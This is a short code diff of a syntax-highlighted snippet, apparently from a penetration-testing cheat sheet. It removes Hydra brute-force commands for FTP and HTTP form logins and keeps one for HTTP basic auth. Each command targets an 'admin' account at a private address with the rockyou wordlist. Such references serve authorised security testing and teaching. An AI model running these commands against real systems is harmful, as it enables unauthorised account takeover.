@@ -1,10 +1,4 @@
 
-<span class="c"># ── FTP ───────────────────────────────────────────────────</span>
-<span class="cmd">hydra</span> <span class="fl">-l</span> admin <span class="fl">-P</span> rockyou.txt ftp<span class="op">://</span><span class="val">192.168.1.10</span>
-
-<span class="c"># ── HTTP FORM LOGIN ───────────────────────────────────────</span>
-<span class="cmd">hydra</span> <span class="fl">-l</span> admin <span class="fl">-P</span> rockyou.txt <span class="val">192.168.1.10</span> http-post-form \
-  <span class="str">"/login:username=^USER^&password=^PASS^:Invalid credentials"</span>
 
 <span class="c"># ── HTTP BASIC AUTH ───────────────────────────────────────</span>
 <span class="cmd">hydra</span> <span class="fl">-l</span> admin <span class="fl">-P</span> rockyou.txt http-get<span class="op">://</span><span class="val">192.168.1.10/admin</span>
